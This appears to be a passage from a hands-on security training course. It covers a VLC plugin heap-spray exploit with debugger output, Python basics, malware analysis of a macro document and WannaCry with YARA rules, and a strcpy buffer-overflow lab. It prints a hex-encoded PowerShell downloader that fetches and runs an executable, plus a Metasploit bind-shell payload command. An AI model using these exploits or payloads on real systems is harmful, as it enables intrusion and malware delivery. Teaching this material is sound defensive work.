+   for(i = 0; i < 50; i++) {
+      memory[i] = nop + shellcode;
+   }
+ 
+   // build the exploit payload
+   var buf = "";
+   for(i = 0; i < 1250; i++)
+      buf += unescape("%41%41%41%41");
+   var track = "smb://example.com\@0.0.0.0/foo/#{" + buf + "}";
+ 
+   // trigger the exploit
+   document.write("<embed type='application/x-vlc-plugin' target='" + track + "' />");
+</script>
+ 
+perl daemon.pl vlc1.html
+ 
+Search for where our NOPS+shellcode lies in the heap
+ 
+s 0 l fffffff 90 90 90 90 cc cc cc cc
+ 
+0:019> s 0 l fffffff 90 90 90 90 cc cc cc cc
+03dffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+040ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+043ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+046ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+049ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+04cffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+04fffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+052ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+055ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+058ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+05bffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+05effffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+061ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+064ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+067ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+06affffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+ 
+Edit vlc2.html
+replace %41%41%41%41 with %07%07%07%07
+ 
+(928.fd0): Break instruction exception - code 80000003 (first chance)
+eax=fffffd66 ebx=07070707 ecx=77c2c2e3 edx=00340000 esi=07070707 edi=07070707
+eip=07100000 esp=0e7afc58 ebp=07070707 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+07100000 cc              int     3
+0:019> u
+07100000 cc              int     3
+07100001 cc              int     3
+07100002 cc              int     3
+07100003 cc              int     3
+07100004 cc              int     3
+07100005 cc              int     3
+07100006 cc              int     3
+07100007 cc              int     3
+ 
+Create vlc3.html (Copy vlc2.html to vlc3.html)
+----------------------------------------------
+Win32 Reverse Shell
+- no restricted characters
+- Encoder NONE
+- use the Javascript encoded payload generated by msfweb
+
+##########################
+# Python Lambda Function #
+##########################
+
+
+Python allows you to create anonymous function i.e function having no names using a facility called lambda function.
+
+lambda functions are small functions usually not more than a line. It can have any number of arguments just like a normal function. The body of lambda functions is very small and consists of only one expression. The result of the expression is the value when the lambda is applied to an argument. Also there is no need for any return statement in lambda function.
+
+Let’s take an example:
+
+Consider a function multiply()
+
+def multiply(x, y):
+    return x * y
+
+
+This function is too small, so let’s convert it into a lambda function.
+
+To create a lambda function first write keyword lambda followed by one of more arguments separated by comma, followed by colon sign ( : ), followed by a single line expression.
+
+>>> r = lambda x, y: x * y
+>>> r(12,3)
+36
+
+Here we are using two arguments x  and y , expression after colon is the body of the lambda function. As you can see lambda function has no name and is called through the variable it is assigned to.
+
+You don’t need to assign lambda function to a variable.
+
+>>> (lambda x, y: x * y)(3,4)
+12
+
+Note that lambda function can’t contain more than one expression.
+
+
+
+##################
+# Python Classes #
+##################
+
+
+****************
+* Introduction *
+****************
+
+Classes are the cornerstone of Object Oriented Programming. They are the blueprints used to create objects. And, as the name suggests, all of Object Oriented Programming centers around the use of objects to build programs. 
+
+You don't write objects, not really. They are created, or instantiated, in a program using a class as their basis. So, you design objects by writing classes. That means that the most important part of understanding Object Oriented Programming is understanding what classes are and how they work.
+
+
+***********************
+* Real World Examples *
+***********************
+
+
+This next part if going to get abstract. You can think of objects in programming just like objects in the real world. Classes are then the way you would describe those objects and the plans for what they can do. 
+
+Start off by thinking about a web vuln scanner. 
+
+What about what they can do? Nearly every web vuln scanner can do the same basic things, but they just might do them differently or at different speeds. You could then describe the actions that a vuln scanner can perform using functions. In Object Oriented Programming, though, functions are called methods. 
+
+So, if you were looking to use "vuln scanner" objects in your program, you would create a "vuln scanner" class to serve as a blueprint with all of the variables that you would want to hold information about your "vuln scanner" objects and all of the methods to describe what you would like your vuln scanner to be able to do.
+
+
+******************
+* A Python Class *
+******************
+
+
+Now that you have a general idea of what a class is, it's best to take a look at a real Python class and study how it is structured.
+
+   ---------------------------Type This-----------------------------------
+
+class WebVulnScanner(object):
+    make = 'Acunetix'
+    model = '10.5'
+    year = '2014'
+    version ='Consultant Edition'
+
+    profile = 'High Risk'
+
+
+    def crawling(self, speed):
+        print("Crawling at %s" % speed)
+
+
+    def scanning(self, speed):
+        print("Scanning at %s" % speed)
+   -----------------------------------------------------------------------
+
+
+Creating a class looks a lot like creating a function. Instead of def you use the keyword, class. Then, you give it a name, just like you would a function. It also has parenthesis like a function, but they don't work the way you think. For a class the parenthesis allow it to extend an existing class. Don't worry about this right now, just understand that you have to put object there because it's the base of all other classes. 
+
+From there, you can see a bunch of familiar things that you'd see floating around any Python program, variables and functions. There are a series of variables with information about the scanner and a couple of methods(functions) describing what the scanner can do. You can see that each of the methods takes two parameters, self and speed. You can see that "speed" is used in the methods to print out how fast the scanner is scanning, but "self" is different.
+
+
+*****************
+* What is Self? *
+*****************
+
+Alright, so "self" is the biggest quirk in the way that Python handles Object Oriented Programming. In most languages, classes and objects are just aware of their variables in their methods. Python needs to be told to remember them. When you pass "self" to a method, you are essentially passing that object to its method to remind it of all of the variables and other methods in that object. You also need to use it when using variables in methods. For example, if you wanted to output the model of the scanner along with the speed, it looks like this.
+
+   ---------------------------Type This-----------------------------------
+
+print("Your %s is crawling at %s" % (self.model, speed))
+   -----------------------------------------------------------------------
+
+It's awkward and odd, but it works, and it's really not worth worrying about. Just remember to include "self" as the first parameter of your methods and "self." in front of your variables, and you'll be alright.
+
+
+*****************
+* Using A Class *
+*****************
+
+
+You're ready to start using the WebVulnScanner class. Create a new Python file and paste the class in. Below, you can create an object using it. Creating, or instantiating, an object in Python looks like the line below.
+   ---------------------------Type This-----------------------------------
+
+myscanner = WebVulnScanner()
+   -----------------------------------------------------------------------
+
+
+That's it. To create a new object, you just have to make a new variable and set it equal to class that you are basing your object on. 
+
+Get your scanner object to print out its make and model.
+   ---------------------------Type This-----------------------------------
+
+print("%s %s" % (myscanner.make, myscanner.model))
+   -----------------------------------------------------------------------
+
+The use of a . between an object and its internal components is called the dot notation. It's very common in OOP. It works for methods the same way it does for variables. 
+   ---------------------------Type This-----------------------------------
+
+myscanner.scanning('10req/sec')
+   -----------------------------------------------------------------------
+
+What if you want to change the profile of your scanning? You can definitely do that too, and it works just like changing the value of any other variable. Try printing out the profile of your scanner first. Then, change the profile, and print it out again.
+   ---------------------------Type This-----------------------------------
+
+print("The profile of my scanner settings is %s" % myscanner.profile)
+myscanner.profile = "default"
+print("The profile of my scanner settings is %s" % myscanner.profile)
+   -----------------------------------------------------------------------
+
+Your scanner settings are default now. What about a new WebVulnScanner? If you made a new scanner object, would the scanning profile be default? Give it a shot.
+   ---------------------------Type This-----------------------------------
+
+mynewscanner = WebVulnScanner()
+print("The scanning profile of my new scanner is %s" % mynewscanner.profile)
+   -----------------------------------------------------------------------
+
+That one's high risk. New objects are copied from the class, and the class still says that the profile is high risk. Objects exist in the computer's memory while a program is running. When you change the values within an object, they are specific to that object as it exists in memory. The changes won't persist once the program stops and won't change the class that it was created from.
+
+
+#########################################
+# The self variable in python explained #
+#########################################
+
+So lets start by making a class involving the self variable.
+
+A simple class :
+
+So here is our class:
+   ---------------------------Type This-----------------------------------
+
+class port(object):
+    open = False
+    def open_port(self):
+        if not self.open:
+            print("port open")
+
+   -----------------------------------------------------------------------
+
+First let me explain the above code without the technicalities. First of all we make a class port. Then we assign it a property “open” which is currently false. After that we assign it a function open_port which can only occur if “open” is False which means that the port is open.
+
+Making a Port:
+
+Now that we have made a class for a Port, lets actually make a port:
+   ---------------------------Type This-----------------------------------
+
+x = port()
+   -----------------------------------------------------------------------
+
+Now x is a port which has a property open and a function open_port. Now we can access the property open by typing:
+   ---------------------------Type This-----------------------------------
+
+x.open
+   -----------------------------------------------------------------------
+
+The above command is same as:
+   ---------------------------Type This-----------------------------------
+
+port().open
+   -----------------------------------------------------------------------
+
+Now you can see that self refers to the bound variable or object. In the first case it was x because we had assigned the port class to x whereas in the second case it referred to port(). Now if we have another port y, self will know to access the open value of y and not x. For example check this example:
+   ---------------------------Type This-----------------------------------
+
+>>> x = port()
+>>> x.open
+False
+>>> y = port()
+>>> y.open = True
+>>> y.open
+True
+>>> x.open
+False
+
+   -----------------------------------------------------------------------
+The first argument of every class method, including init, is always a reference to the current instance of the class. By convention, this argument is always named self. In the init method, self refers to the newly created object; in other class methods, it refers to the instance whose method was called. For example the below code is the same as the above code.
+
+   ---------------------------Type This-----------------------------------
+
+class port(object):
+    open = False
+    def open_port(this):
+        if not this.open:
+            print("port open")
+
+   -----------------------------------------------------------------------
+
+
+
+
+
+
+##################################
+# Day 3 Homework videos to watch #
+##################################
+Here is your first set of youtube videos that I'd like for you to watch:
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (watch videos 21-30)
+
+
+
+
+
+
+
+
+
+
+
+
+                            #######################################
+----------- ############### # Day 4: Malware analysis with Python # ############### -----------
+                            #######################################
+
+
+###############################
+# Lesson 28: Malware Analysis #
+###############################
+ 
+ 
+ 
+ 
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+ 
+ 
+The fastest thing you can do is perform static analysis.
+    ---------------------------Type This-----------------------------------
+
+sudo pip install olefile
+     infosecaddicts
+ 
+mkdir ~/Desktop/oledump
+ 
+cd ~/Desktop/oledump
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+    -----------------------------------------------------------------------
+
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+     ---------------------------Type This-----------------------------------
+
+python oledump.py 064016.doc -s A5 -v
+     -----------------------------------------------------------------------
+
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+     ---------------------------Type This-----------------------------------
+
+python oledump.py 064016.doc -s A3 -v
+     -----------------------------------------------------------------------
+
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+ 
+ 
+ 
+###################
+# Static Analysis #
+###################
+ 
+- After logging please open a terminal window and type the following commands:
+     ---------------------------Type This-----------------------------------
+ 
+cd Desktop/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+mv wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+     -----------------------------------------------------------------------
+ 
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+     ---------------------------Type This-----------------------------------
+ 
+ 
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+ 
+ 
+ 
+     -----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+     ---------------------------Type This-----------------------------------
+ 
+ 
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+ 
+ 
+      -----------------------------------------------------------------------
+
+ 
+ 
+ 
+ 
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+      ---------------------------Type This-----------------------------------
+
+ 
+sudo apt install -y python-pefile
+     infosecaddicts
+ 
+ 
+ 
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+vi am.py
+ 
+python am.py wannacry.exe
+ 
+ 
+      -----------------------------------------------------------------------
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+##############
+# Yara Ninja #
+##############
+     ---------------------------Type This-----------------------------------
+
+cd ~/Desktop
+ 
+sudo apt-get remove -y yara
+     infosecaddcits
+ 
+sudo apt -y install libtool
+     infosecaddicts
+ 
+wget https://github.com/VirusTotal/yara/archive/v3.6.0.zip
+ 
+ 
+unzip v3.6.0.zip
+ 
+cd yara-3.6.0
+ 
+./bootstrap.sh
+ 
+./configure
+ 
+make
+ 
+sudo make install
+    infosecaddicts
+ 
+yara -v
+ 
+cd ~/Desktop
+ 
+ 
+      -----------------------------------------------------------------------
+ 
+ 
+NOTE:
+McAfee is giving these yara rules - so add them to the hashes.txt file
+ 
+Reference:
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+----------------------------------------------------------------------------
+rule wannacry_1 : ransom
+{
+    meta:
+        author = "Joshua Cannell"
+        description = "WannaCry Ransomware strings"
+        weight = 100
+        date = "2017-05-12"
+ 
+    strings:
+        $s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+        $s2 = "Wanna Decryptor" wide ascii nocase
+        $s3 = ".wcry" wide ascii nocase
+        $s4 = "WANNACRY" wide ascii nocase
+        $s5 = "WANACRY!" wide ascii nocase
+        $s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+ 
+    condition:
+        any of them
+}
+ 
+----------------------------------------------------------------------------
+rule wannacry_2{
+    meta:
+        author = "Harold Ogden"
+        description = "WannaCry Ransomware Strings"
+        date = "2017-05-12"
+        weight = 100
+ 
+    strings:
+        $string1 = "msg/m_bulgarian.wnry"
+        $string2 = "msg/m_chinese (simplified).wnry"
+        $string3 = "msg/m_chinese (traditional).wnry"
+        $string4 = "msg/m_croatian.wnry"
+        $string5 = "msg/m_czech.wnry"
+        $string6 = "msg/m_danish.wnry"
+        $string7 = "msg/m_dutch.wnry"
+        $string8 = "msg/m_english.wnry"
+        $string9 = "msg/m_filipino.wnry"
+        $string10 = "msg/m_finnish.wnry"
+        $string11 = "msg/m_french.wnry"
+        $string12 = "msg/m_german.wnry"
+        $string13 = "msg/m_greek.wnry"
+        $string14 = "msg/m_indonesian.wnry"
+        $string15 = "msg/m_italian.wnry"
+        $string16 = "msg/m_japanese.wnry"
+        $string17 = "msg/m_korean.wnry"
+        $string18 = "msg/m_latvian.wnry"
+        $string19 = "msg/m_norwegian.wnry"
+        $string20 = "msg/m_polish.wnry"
+        $string21 = "msg/m_portuguese.wnry"
+        $string22 = "msg/m_romanian.wnry"
+        $string23 = "msg/m_russian.wnry"
+        $string24 = "msg/m_slovak.wnry"
+        $string25 = "msg/m_spanish.wnry"
+        $string26 = "msg/m_swedish.wnry"
+        $string27 = "msg/m_turkish.wnry"
+        $string28 = "msg/m_vietnamese.wnry"
+ 
+ 
+    condition:
+        any of ($string*)
+}
+----------------------------------------------------------------------------
+ 
+ 
+#######################
+# External DB Lookups #
+#######################
+ 
+Creating a malware database (sqlite)
+      ---------------------------Type This-----------------------------------
+
+sudo apt install -y python-simplejson python-simplejson-dbg
+    infosecaddicts
+ 
+ 
+ 
+wget https://raw.githubusercontent.com/mboman/mart/master/bin/avsubmit.py
+ 
+ 
+ 
+python avsubmit.py -f wannacry.exe -e
+ 
+----------------------------------------------------------------------------
+ 
+Analysis of the file can be found at:
+http://www.threatexpert.com/report.aspx?md5=84c82835a5d21bbcf75a61706d8ab549
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###############################
+# Creating a Malware Database #
+###############################
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+      ---------------------------Type This-----------------------------------
+ 
+sudo apt install -y mysql-server
+     infosecaddicts
+     
+- Step 2: Installing Python MySQLdb module
+- Run the following command in the terminal:
+ 
+sudo apt-get build-dep python-mysqldb
+     infosecaddicts
+ 
+sudo apt install -y python-mysqldb
+     infosecaddicts
+ 
+Step 3: Logging in
+Run the following command in the terminal:
+ 
+mysql -u root -p                    (set a password of 'malware')
+ 
+- Then create one database by running following command:
+ 
+create database malware;
+ 
+exit;
+ 
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+ 
+vi mal_to_db.py                     (fill in database connection information)
+ 
+python mal_to_db.py -i
+ 
+------- check it to see if the files table was created ------
+ 
+mysql -u root -p
+    malware
+ 
+show databases;
+ 
+use malware;
+ 
+show tables;
+ 
+describe files;
+ 
+exit;
+ 
+      -----------------------------------------------------------------------
+ 
+ 
+- Now add the malicious file to the DB
+      ---------------------------Type This-----------------------------------
+
+ 
+python mal_to_db.py -f wannacry.exe -u
+ 
+       -----------------------------------------------------------------------
+
+ 
+- Now check to see if it is in the DB
+       ---------------------------Type This-----------------------------------
+
+mysql -u root -p
+    malware
+ 
+mysql> use malware;
+ 
+select id,md5,sha1,sha256,time FROM files;
+ 
+mysql> quit;
+ 
+      -----------------------------------------------------------------------
+ 
+ 
+ 
+######################################
+# PCAP Analysis with forensicPCAP.py #
+######################################
+      ---------------------------Type This-----------------------------------
+
+cd ~/Desktop
+wget https://raw.githubusercontent.com/madpowah/ForensicPCAP/master/forensicPCAP.py
+sudo easy_install cmd2
+ 
+python forensicPCAP.py Browser\ Forensics/suspicious-time.pcap
+ 
+ForPCAP >>> help
+ 
+ 
+Prints stats about PCAP
+ForPCAP >>> stat
+ 
+ 
+Prints all DNS requests from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dns
+ 
+ForPCAP >>> show
+ 
+ 
+Prints all destination ports from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dstports
+ 
+ForPCAP >>> show
+ 
+ 
+Prints the number of ip source and store them.
+ForPCAP >>> ipsrc
+ 
+ 
+Prints the number of web's requests and store them
+ForPCAP >>> web
+ 
+ 
+Prints the number of mail's requests and store them
+ForPCAP >>> mail
+
+      -----------------------------------------------------------------------
+
+
+
+
+
+
+##################################
+# Day 4 Homework videos to watch #
+##################################
+Here is your first set of youtube videos that I'd like for you to watch:
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (watch videos 31-40)
+
+
+
+
+
+
+
+
+
+
+                            ##########################################
+----------- ############### # Day 4: Debugger automation with Python # ############### -----------
+                            ##########################################
+
+In this lab we are going to exploit the bufferoverflow in the program which is a simple tcp server using the strcpy in its code. Download the server's .exe file from here http://code.securitytube.net/Server-Strcpy.exe
+
+Run the server on windows machine.
+
+Connect to the server from an ubuntu machine using nc <ip-adress of windows> 10000. Send some character from there and see if it returns the same.
+
+
+
+It's a simple echo server. Reflects whatever you type in the input we send to this program, is stored using strcpy.  Let us write a simple python program that sends a large input to the program and see if it can handle large inputs. 
+      ---------------------------Type This-----------------------------------
+
+vim strcpy.py
+
+./strcpy <server adress>
+
+      -----------------------------------------------------------------------
+
+
+On the server machine see if the server crashes and what error it shows.
+
+Now let's find out what happens behind the scenes when you run the python script against your echo server. When you do not have the source code of the program that you need to debug, the only way to do so is to take the binary, disassemble and debug it to actually see what is happening. The immunity debugger is the tool which does all that.
+
+Open the server.exe file in immunity debugger. It will show information about the binary in different sections including Registers [EIP, ESP, EBP, etc], the machine language equivalent and addresses of the binary with their values.
+
+Now press the run button and the binary will be in the “Running” state. Execute the strcpy.py script as done previously. The binary will crash again and immunity debugger will show it in “Paused” State. It will also show the stack with its values and ASCII equivalent which is seen as “AAAA...” as all the characters sent from the script are As, as shown in the figure below.
+
+
+We can also write python scripts using the python shell provided by the Immunity Debugger. The scripts we write here need to be placed in “C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands” directory, which will be automatically made available to immunity debugger at run-time. 
+
+ 
+Now open the python shell, Create “New Window” and save it as spse-demo in the PyCommands directory mentioned above. 
+
+
+
+In order to leverage the rich set of APIs that Immunity provides, import the immlib which ships with the Immunity framework. At this instance write a simple script that simply prints hello in the main method. To run the script write the name of the script preceded by the exclamation mark e.g !spse-demo. You can also write to the Log window by:
+imm.log(“Anything to log”)
+
+Now the problem with the debugger is that it prints all the messages at the end of the script execution, which is quite hectic if you are writing a long script which requires incremental updates. To serve the purpose use imm.updateLog() method so that the Log is updated instantly.
+
+Our command will also be visible in the List of PyCommands  which are available in the Immunity.
+
+
+To run a process we need to open the process in Immunity Debugger and run it as shown earlier, what if we want to run the same process programmatically. 
+
+Create a new python script naming spse-pro.py similarly as in the previous example. Open the process by imm.openProcess(“path to the binary”) e.g my binary was C:\Server-Strcpy.exe
+
+
+Similarly, you can attach the Immunity Debugger to an already running process by the imm.Attach(pid) method.
+
+Now inside a running process we need to get a list of modules, and for each of these modules we need to get a set of properties like Name, Base Address, Entry Point, and Size of that process. Useful methods are getAllModules and its child methods which are elaborated in the Immunity's online documentation. 
+
+
+
+
+Now we will use the Immunity Debugger to actually exploit the buffer overflow.
+
+As we know the stack grows from high-memory to low-memory. When we send a large buffer to our program/binary the return address is over-written, the EIP ends up with a garbage value and the program crashed. The idea is to specially craft the buffer in a way to over-write the return address with a chosen value, which is the payload we want to execute on that machine.
+
+To start, we'll revisit our old python script and a metasploit utility patter_creat.rb to create a random pattern of 500 characters.
+
+ 
+
+Place this pattern in the python attack script, run the server in the Immunity, run the attack script. See that the binary has crashed and the EIP is populated with the value 6A413969. Now we need to find at which offset this value is in our pattern, pattern_offset.rb will server the purpose.
+
+ 
+
+From this we know the value from offset 268 precisely corrupts the EIP. Meaning we really don't care about the first 268 bytes of the buffer, what we need to focus is the return address. 
+
+Now next to EIP there is ESP register, we will populate the ESP with our payload and place a jump ESP instruction in the EIP register. The OPCode for the JUMP ESP instruction is 71AB7BFB, which we will append to our buffer in reverse order, as the bytes are stored in reverse order in stack. For payload we use metsploit to generate our payload and encode it for x86 architecture. Following command will suffice
+
+      ---------------------------Type This-----------------------------------
+
+msfpayload windows/shell_bind_tcp R | msfencode -a x86 -b “\x90” -t c
+      -----------------------------------------------------------------------
+
+This will generate a payload, append it to the buffer and run the script again.
